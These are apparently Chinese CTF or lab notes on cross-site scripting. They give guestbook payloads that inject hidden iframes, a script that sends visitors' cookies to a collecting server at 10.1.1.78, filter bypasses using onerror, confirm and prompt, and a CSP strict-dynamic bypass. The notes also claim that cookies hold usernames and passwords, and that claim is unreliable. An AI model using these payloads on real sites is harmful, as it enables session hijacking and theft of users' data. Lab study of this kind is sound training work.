# CTF - XSS跨站脚本攻击

[TOC]

## XSS跨站漏洞利用

### 利用XSS跨站漏洞加载恶意网页

将恶意网页（假设`http://www.heetian.com`）放入留言系统数据库，并在用户端执行；

1. 增加一留言，并在留言内容中改为 `<iframe src="http://www.heetian.com"></iframe>`，测试返回效果。

   ![image-20200823180011273](image\image-20200823180011273.png)

   ![158](image\6266eea1-494b-4ee9-bb5e-449af8ee0c88.png)

2. 隐藏恶意网页。

   增加留言，内容包含以下语句：`<iframe src=http://www.baidu.com width="0" height="0"></iframe>`，观察返回状态，网页被执行，但未在留言系统界面中显示。这样如果是攻击脚本就可以用此方法隐藏自己。



### 利用XSS跨站漏洞窃取用户cookie

1. 添加留言，包含以下内容：`<script>document.write(document.cookie)</script>`

   结果如图所示：

      ![159](image\9fc9bb1c-c181-4051-99ac-fcd038cd4542.png)

2. 添加留言，包含以下内容：`<script>alert(document.cookie)</script>`

   观察显示的cookie有什么不同？

      ![img](image\3559096b-6323-488e-a349-41a55ea11944.jpg)

3. 搭建WEB服务器，以便进一步保存浏览用户的cookie。

   添加留言，包含以下内容：`<script>document.write("<iframe width=0 height=0 src='http://10.1.1.78/cookie.asp?cookie="+document.cookie+"'></iframe>");</script>`

      ![164](image\c72f833f-e10e-424d-adb7-151a49e19612.png)

4.  提交留言后观察目标服务器页面，没有看到异常现象，如下图所示：

     ![165](image\72a8b172-63ae-4ea4-ac35-191518cada89.png)

   再打开本地页面，查看接收浏览用户的cookie接收情况：

      <img src="image\765d19f7-c6a4-487f-9ceb-de269574aea4.png" alt="img"  />

   可以看到，已经接收到用户的cookie了，这些cookie包含了所有浏览该页面的信息，如果是登录用户的话，cookie包含了用户的用户名与密码信息。



[返回目录](#CTF - XSS跨站脚本攻击)

------



## XSS 绕过

### 利用 onerror 绕过 `<script>` 过滤

![img](\image\63dc32e6-6d02-4bb2-aca4-f45821130178.png)

preg_match 函数用于执行一个正则表达式匹配。

onerror 事件在视频/音频（audio/video）数据加载期间发生错误时触发。

绕过方式：

```
<audio src="" onerror=alert("XSS")>
```



### 利用 confirm、prompt 代替 alert

![img](image\a91d7773-cd54-486f-876a-a1a31b152eb7.jpg)

preg_match 函数用于执行一个正则表达式匹配。

绕过方式：

```
<script>confirm("xss")</script>
<script>prompt("xss")</script>
```



### $_SERVER（超全局变量部分含义）

1. $_SERVER['REMOTE_ADDR'] *//当前用户 IP 。 //[REMOTE_ADDR] => ::1*
2. $_SERVER['REMOTE_HOST'] *//当前用户主机名* 
3. $_SERVER['REQUEST_URI'] *//URL   //   [REQUEST_URI] => /objqt/test.php*
4. $_SERVER['REMOTE_PORT'] *//端口。 // [REMOTE_PORT] => 52902*
5. $_SERVER['SERVER_NAME'] *//服务器主机的名称。 //  [SERVER_NAME] => localhost*
6. $_SERVER['PHP_SELF']*//正在执行脚本的文件名*  
7. $_SERVER['SERVER_PROTOCOL'] *//请求页面时通信协议的名称和版本 //[SERVER_PROTOCOL] => HTTP/1.1*
8. $_SERVER['REQUEST_METHOD']*//访问页面时的请求方法  //[REQUEST_METHOD] => GET*
9. $_SERVER['DOCUMENT_ROOT'] *//当前运行脚本所在的文档根目录 //  [DOCUMENT_ROOT] => E:/php/wamp/www*
10. $_SERVER['HTTP_HOST'] *//当前请求的 Host: 头部的内容。 //  [HTTP_HOST] => localhost:8080*
11. $_SERVER['SCRIPT_FILENAME'] *#当前执行脚本的绝对路径名。 //  [SCRIPT_FILENAME] => E:/php/wamp/www/objqt/test.php*
12. $_SERVER['SERVER_PORT'] *#服务器所使用的端口 // [SERVER_PORT] => 8080*
13. $_SERVER['SCRIPT_NAME'] *#包含当前脚本的路径。这在页面需要指向自己时非常有用。 //[SCRIPT_NAME] => /objqt/test.php*



### CSP绕过

CSP：实质就是白名单制度，它规定哪些外部资源可以加载和执行。它的实现和执行全部由浏览器完成。资源加载通过”script-src“、”style-src” 等选项来限制外部资源的加载。

”script-src”限制外部脚本的加载。

strict-dynamic 特性允许**将信任关系传递给由受信任的script动态生成的脚本**，忽略了script-src的白名单，使得之后生成的脚本可以执行。

![img](image\8439fc7d-4c29-4487-b528-aac5c3fc40c2.gif)



基于Ajaxify框架， Ajaxify框架会将所有带有 `class=document-script` 属性的 `<div>` 标签转化为 JavaScript 脚本元素。CSP中的strict-dynamic 特性允许将信任关系传递给动态生成的脚本，可以绕过script-src白名单限制，使得当从客户端插入JS时可以被解释执行。

利用代码：

```
<div class=document-script>alert(1)</div>
```

